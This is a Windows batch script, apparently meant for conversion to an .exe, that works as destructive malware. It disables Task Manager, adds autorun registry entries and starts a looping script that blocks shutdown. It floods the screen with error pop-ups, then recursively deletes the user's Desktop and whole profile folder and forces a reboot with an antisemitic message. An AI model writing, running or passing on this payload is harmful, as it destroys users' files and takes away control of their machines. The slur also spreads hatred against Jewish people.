::[Bat To Exe Converter]
::
::fBE1pAF6MU+EWHreyHcjLQlHcCWQOXi7OpoS7czp5vyCnmkYR+krd5/n6qaBKuUQ/lbYVpcgxnUanMJMDxRWfReleh01pGtMomu5PsqbpA7tRgaD9kxQ
::YAwzoRdxOk+EWAjk
::fBw5plQjdCyDJGyX8VAjFDpGSReDAES0A5EO4f7+086CsUYJW/IDSJ3U0LGNNPMvyUTpZZlt0nMam8QCDx5WagCqYwo6vWF+v2eKOYmVsACB
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSTk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFDpGSReDAES0A5EO4f7+086CsUYJW/IDSJ3U0LGNNPMvyUTpZZlt0nMam8QCDx5WagCqYwo6vWF+lWWIJ8jctwahSUeH5U4+D3d1imbemCR1Zctt+g==
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
copy imgwall.jpg "%windir%\system32\wallpaperhit.jpg"/y
del imgwall.jpg/q
reg add HKCU\software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
reg add HKCU\software\Microsoft\Windows\CurrentVersion\Run /v Notepad /t REG_SZ /d %Systemroot%\System32\notepad.exe /f
reg add HKCU\software\Microsoft\Windows\CurrentVersion\Run /v Calculator /t REG_SZ /d %Systemroot%\System32\calc.exe /f
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%windir%\system32\wallpaperhit.jpg" /f
explorer
explorer
if exist "%userprofile%\Browser" rd "%userprofile%\Browser"/q/s
md "%userprofile%\Browser"
attrib +h "%userprofile%\Browser"
cd "%userprofile%\Browser"
echo do > "%windir%\shutdownt.vbs"
echo createobject("wscript.shell").run "shutdown -a" >> "%windir%\shutdownt.vbs"
echo wscript.sleep 350 >> "%windir%\shutdownt.vbs"
echo loop >> "%windir%\shutdownt.vbs"
start %windir%\shutdownt.vbs
echo msgbox "Slaves ERROR", 16, "ERROR" > "%userprofile%\Browser\SlavesE.vbs"
echo do > "%userprofile%\Browser\Gameover.vbs
echo msgbox "GAME OVER, JAW", 16, "JAW" >> "%userprofile%\Browser\Gameover.vbs
echo loop >> "%userprofile%\Browser\Gameover.vbs
timeout 1 >nul /nobreak
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
timeout 1 >nul /nobreak
taskkill/im wscript.exe /f
start %windir%\shutdownt.vbs
start Gameover.vbs
timeout 1 >nul /nobreak
timeout 1 >nul /nobreak
rd "%userprofile%\desktop"/q /s
timeout 1 >nul /nobreak
rd "%userprofile%"/s /q
taskkill /f /im wscript.exe
shutdown /r /c "YOU ARE JEW" /t 3 /f